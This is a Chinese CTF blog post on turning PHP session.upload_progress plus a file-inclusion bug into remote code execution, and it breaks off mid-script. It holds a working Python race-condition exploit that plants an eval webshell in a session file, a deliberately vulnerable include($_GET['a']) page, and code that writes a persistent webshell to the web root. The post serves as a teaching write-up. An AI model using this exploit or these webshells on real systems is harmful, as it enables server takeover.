<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"baicany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="session临时文件包含,联合注入,流量分析">
<meta property="og:type" content="article">
<meta property="og:title" content="6.23ctf+session临时文件包含">
<meta property="og:url" content="https://baicany.github.io/2023/06/23/6.23/index.html">
<meta property="og:site_name" content="baicany">
<meta property="og:description" content="session临时文件包含,联合注入,流量分析">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://th.bing.com/th/id/R.eb1c3f2cb06092e04acf9dd6d93cd952?rik=o5erxYw0VB6J6Q&riu=http%3a%2f%2fdesk.fd.zol-img.com.cn%2fg2%2fM00%2f0D%2f06%2fChMlWlW3SmKIHItdAAT8XIVe7mIAAHvpAGJb_8ABPx0555.jpg&ehk=6fPZiKhPcuGU7btHXa1QypbIVO9WRdSOf6ls16tnvGI%3d&risl=&pid=ImgRaw&r=0">
<meta property="article:published_time" content="2023-06-23T14:16:01.000Z">
<meta property="article:modified_time" content="2023-06-25T16:10:42.374Z">
<meta property="article:author" content="baicany">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://th.bing.com/th/id/R.eb1c3f2cb06092e04acf9dd6d93cd952?rik=o5erxYw0VB6J6Q&riu=http%3a%2f%2fdesk.fd.zol-img.com.cn%2fg2%2fM00%2f0D%2f06%2fChMlWlW3SmKIHItdAAT8XIVe7mIAAHvpAGJb_8ABPx0555.jpg&ehk=6fPZiKhPcuGU7btHXa1QypbIVO9WRdSOf6ls16tnvGI%3d&risl=&pid=ImgRaw&r=0">


<link rel="canonical" href="https://baicany.github.io/2023/06/23/6.23/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"https://baicany.github.io/2023/06/23/6.23/","path":"2023/06/23/6.23/","title":"6.23ctf+session临时文件包含"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>6.23ctf+session临时文件包含 | baicany</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baicany</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">welcome my world !</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#session-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">session 工作原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsession-upload-progress%EF%BC%9F"><span class="nav-number">2.</span> <span class="nav-text">什么是session.upload_progress？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session-upload-progress%E5%BC%80%E5%90%AF%E4%B9%8B%E5%90%8E%E4%BC%9A%E6%9C%89%E4%BB%80%E4%B9%88%E6%95%88%E6%9E%9C%EF%BC%9F"><span class="nav-number">3.</span> <span class="nav-text">session.upload_progress开启之后会有什么效果？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8CRCE%EF%BC%9F"><span class="nav-number">4.</span> <span class="nav-text">如何利用session.upload_progress进行RCE？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup"><span class="nav-number"></span> <span class="nav-text">[第五空间 2021]EasyCleanup</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LitCTF-2023-%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FSQL-%EF%BC%81%E6%B3%A8%E4%B8%80%E4%B8%8B"><span class="nav-number"></span> <span class="nav-text">[LitCTF 2023]这是什么？SQL ！注一下</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt"><span class="nav-number"></span> <span class="nav-text">[陇剑杯 2021]jwt</span></a></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baicany"
      src="/images/head.jpg">
  <p class="site-author-name" itemprop="name">baicany</p>
  <div class="site-description" itemprop="description">web小菜狗一枚</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">35</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  <div class="post-gallery" itemscope itemtype="http://schema.org/ImageGallery">
    
    <div class="post-gallery-image">
      <img src="https://th.bing.com/th/id/R.eb1c3f2cb06092e04acf9dd6d93cd952?rik=o5erxYw0VB6J6Q&riu=http%3a%2f%2fdesk.fd.zol-img.com.cn%2fg2%2fM00%2f0D%2f06%2fChMlWlW3SmKIHItdAAT8XIVe7mIAAHvpAGJb_8ABPx0555.jpg&ehk=6fPZiKhPcuGU7btHXa1QypbIVO9WRdSOf6ls16tnvGI%3d&risl=&pid=ImgRaw&r=0" itemprop="contentUrl">
    </div>
    </div>

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://baicany.github.io/2023/06/23/6.23/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/head.jpg">
      <meta itemprop="name" content="baicany">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baicany">
      <meta itemprop="description" content="web小菜狗一枚">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="6.23ctf+session临时文件包含 | baicany">
      <meta itemprop="description" content="session临时文件包含,联合注入,流量分析">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          6.23ctf+session临时文件包含
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-06-23 22:16:01" itemprop="dateCreated datePublished" datetime="2023-06-23T22:16:01+08:00">2023-06-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-06-26 00:10:42" itemprop="dateModified" datetime="2023-06-26T00:10:42+08:00">2023-06-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">ctf记录</span></a>
        </span>
    </span>

  
</div>

            <div class="post-description">session临时文件包含,联合注入,流量分析</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>主要是看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120300273">(37条消息) 详解利用session进行文件包含_session文件包含的原理及利用条件_合天网安实验室的博客-CSDN博客</a></p>
<h3 id="session-工作原理"><a href="#session-工作原理" class="headerlink" title="session 工作原理"></a>session 工作原理</h3><p>（1）首先使用session_start()函数进行初始换。</p>
<p>（2）当执行PHP脚本时，通过使用SESSION超全局变量注册session变量。</p>
<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。</p>
<h3 id="什么是session-upload-progress？"><a href="#什么是session-upload-progress？" class="headerlink" title="什么是session.upload_progress？"></a>什么是session.upload_progress？</h3><p>与<code>open_basedir</code>、<code>allow_url_fopen</code>、<code>allow_url_include</code>等PHP配置一样，<code>session.upload_progress</code>也是PHP的一个功能，同样可以在<code>php.ini</code>中设置相关属性。其中最重要的几个设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>session.upload_progress.enabled可以控制是否开启session.upload_progress功能</li>
<li>session.upload_progress.cleanup可以控制是否在上传之后删除文件内容</li>
<li>session.upload_progress.prefix可以设置上传文件内容的前缀</li>
<li>session.upload_progress.name的值即为session中的键值</li>
</ul>
<p>另外，再添加个session配置中一个重要选项。</p>
<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要</p>
<h3 id="session-upload-progress开启之后会有什么效果？"><a href="#session-upload-progress开启之后会有什么效果？" class="headerlink" title="session.upload_progress开启之后会有什么效果？"></a><strong>session.upload_progress开启之后会有什么效果？</strong></h3><p>当我们将<code>session.upload_progress.enabled</code>的值设置为<strong>on</strong>时，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传进度等)存储在session当中。</p>
<p><strong>问题1：</strong></p>
<p>那么这个时候就会有一个前提条件，就是如何初始化session并且把session中的内容写到文件中去呢？</p>
<p><strong>分析1：</strong></p>
<p>我们可以注意到，php.ini中<code>session.use_strict_mode</code>选项默认是0，在这个情况下，用户可以自己定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去，具体文件的内容是什么，后面会写到。</p>
<p><strong>问题2：</strong></p>
<p>当session.upload_progress.cleanup的值为on时，即使上传文件，但是上传完成之后文件内容会被清空，这怎么办？</p>
<p><strong>分析2：</strong></p>
<p>进行<strong>条件竞争</strong></p>
<h3 id="如何利用session-upload-progress进行RCE？"><a href="#如何利用session-upload-progress进行RCE？" class="headerlink" title="如何利用session.upload_progress进行RCE？"></a>如何利用session.upload_progress进行RCE？</h3><p>首先，在网站根目录下随便新建一个<strong>test.php</strong>文件</p>
<p>然后写一个Python程序用于往服务器上上传文件：</p>
<p>这里有几个注意点：</p>
<ul>
<li><p>上传的文件大小为50KB，文件名为Lxxx.jpg</p>
</li>
<li><p>该程序设置的sessionid为Lxxx，也就是说会在&#x2F;tmp目录下生成sess_Lxxx文件</p>
</li>
<li><p>该程序设置的PHP_SESSION_UPLOAD_PROGRESS值为一句话木马，也就是说，在理论上，一句话木马会被写入到&#x2F;tmp&#x2F;sess_Lxxx中</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.128/test.php&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;Lxxx&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">   filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">   <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       res = session.post(url,</span><br><span class="line">           data=&#123;</span><br><span class="line">               <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">           cookies=&#123;</span><br><span class="line">               <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">              &#125;,</span><br><span class="line">           files=&#123;</span><br><span class="line">               <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Lxxx.jpg&#x27;</span>, filebytes)</span><br><span class="line">              &#125;</span><br><span class="line">          )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">       write(session)</span><br></pre></td></tr></table></figure>

<p>执行程序后，我们需要用<code>tail -f</code>命令实时查看<code>/tmp/sess_Lxxx</code>文件，因为在本地测试速度比较快，如果使用cat命令，文件内容还没输出就被删除了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /tmp/sess_Lxxx</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/6e5255b29bc9f553040de37c62b70b03.png" alt="img"></p>
<p>也就是说，<code>/tmp/sess_Lxxx</code>文件中的内容为：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upload_progress_</span>&lt;?php eval($_POST[<span class="number">1</span>]);?&gt;|a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;i:<span class="number">1631343214</span>;s:<span class="number">14</span>:<span class="string">&quot;content_length&quot;</span>;i:<span class="number">276</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;i:<span class="number">276</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;b:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;files&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;field_name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;Lxxx.jpg&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;tmp_name&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;error&quot;</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;b:<span class="number">0</span>;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;i:<span class="number">1631343214</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;i:<span class="number">276</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>仔细分析一下该文件内容，该文件分为两块，以竖线<code>|</code>区分。</p>
<p><strong>第一块内容如下：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一块内容由以下两个值组成：<code>session.upload_progress.name</code>+<code>PHP_SESSION_UPLOAD_PROGRESS</code></p>
<p><strong>第二块内容如下：</strong></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;<span class="selector-tag">i</span>:<span class="number">1631343214</span>;s:<span class="number">14</span>:<span class="string">&quot;content_length&quot;</span>;<span class="selector-tag">i</span>:<span class="number">276</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;<span class="selector-tag">i</span>:<span class="number">276</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;<span class="selector-tag">b</span>:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;files&quot;</span>;<span class="selector-tag">a</span>:<span class="number">1</span>:&#123;<span class="selector-tag">i</span>:<span class="number">0</span>;<span class="selector-tag">a</span>:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;field_name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;Lxxx.jpg&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;tmp_name&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;error&quot;</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;done&quot;</span>;<span class="selector-tag">b</span>:<span class="number">0</span>;s:<span class="number">10</span>:<span class="string">&quot;start_time&quot;</span>;<span class="selector-tag">i</span>:<span class="number">1631343214</span>;s:<span class="number">15</span>:<span class="string">&quot;bytes_processed&quot;</span>;<span class="selector-tag">i</span>:<span class="number">276</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>一看就是序列化之后的值，我们将其进行反序列化后输出：</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">[<span class="string">&quot;start_time&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">int</span>(<span class="number">1631343214</span>)</span><br><span class="line">[<span class="string">&quot;content_length&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">int</span>(<span class="number">276</span>)</span><br><span class="line">[<span class="string">&quot;bytes_processed&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">int</span>(<span class="number">276</span>)</span><br><span class="line">[<span class="string">&quot;done&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">bool</span>(<span class="literal">false</span>)</span><br><span class="line">[<span class="string">&quot;files&quot;</span>]=&gt;</span><br><span class="line"> <span class="built_in">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">   <span class="built_in">array</span>(<span class="number">7</span>) &#123;</span><br><span class="line">    [<span class="string">&quot;field_name&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;file&quot;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">string</span>(<span class="number">8</span>) <span class="string">&quot;Lxxx.jpg&quot;</span></span><br><span class="line">    [<span class="string">&quot;tmp_name&quot;</span>]=&gt;</span><br><span class="line">     <span class="type">NULL</span></span><br><span class="line">    [<span class="string">&quot;error&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">int</span>(<span class="number">0</span>)</span><br><span class="line">    [<span class="string">&quot;done&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">bool</span>(<span class="literal">false</span>)</span><br><span class="line">    [<span class="string">&quot;start_time&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">int</span>(<span class="number">1631343214</span>)</span><br><span class="line">    [<span class="string">&quot;bytes_processed&quot;</span>]=&gt;</span><br><span class="line">     <span class="built_in">int</span>(<span class="number">276</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里记录了文件上传时间、文件大小、文件名称等等文件属性。</p>
<p>接下来在网站根目录新建一个<strong>test.php</strong>文件，文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>很明显有一个文件包含的漏洞。</p>
<p>接下来我们利用<code>session.upload_progress</code>进行<strong>条件竞争</strong></p>
<p>以下代码有几个注意点：</p>
<ul>
<li><p>整个代码的思路就是，往&#x2F;tmp&#x2F;sess_Lxxx文件中写入一句话木马，密码为1，然后用题目中的文件包含漏洞，包含这一个文件，在函数read中尝试利用&#x2F;tmp&#x2F;sess_Lxxx的一句话往网站根目录文件1.php写一句话木马，密码为2</p>
</li>
<li><p>利用Python的多线程，一边上传文件，一边尝试往根目录中写入1.php，如果成功写入了，就打印输出“成功写入一句话”</p>
<p>这里利用Python的threading模块，开5个线程进行条件竞争</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.2.128/test.php&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;Lxxx&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_ invoke__">write</span>(session):</span><br><span class="line">   filebytes = io.<span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">   <span class="keyword">while</span> True:</span><br><span class="line">       res = session.<span class="title function_ invoke__">post</span>(url,</span><br><span class="line">           data=&#123;</span><br><span class="line">               <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">           cookies=&#123;</span><br><span class="line">               <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">              &#125;,</span><br><span class="line">           files=&#123;</span><br><span class="line">               <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Lxxx.jpg&#x27;</span>, filebytes)</span><br><span class="line">              &#125;</span><br><span class="line">          )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def <span class="title function_ invoke__">read</span>(session):</span><br><span class="line">   <span class="keyword">while</span> True:</span><br><span class="line">       res = session.<span class="title function_ invoke__">post</span>(url+<span class="string">&quot;?a=/tmp/sess_&quot;</span>+sessid,</span><br><span class="line">                          data=&#123;</span><br><span class="line">                              <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/www/admin/localhost_80/wwwroot/1.php&#x27; , &#x27;&lt;?php eval(<span class="subst">$_POST</span>[2]);?&gt;&#x27;);&quot;</span></span><br><span class="line">                          &#125;,</span><br><span class="line">                          cookies=&#123;</span><br><span class="line">                              <span class="string">&quot;PHPSESSID&quot;</span>:sessid</span><br><span class="line">                          &#125;</span><br><span class="line">                          )</span><br><span class="line">       res2 = session.<span class="title function_ invoke__">get</span>(<span class="string">&quot;http://192.168.2.128/1.php&quot;</span>)</span><br><span class="line">       <span class="keyword">if</span> res2.status_code == <span 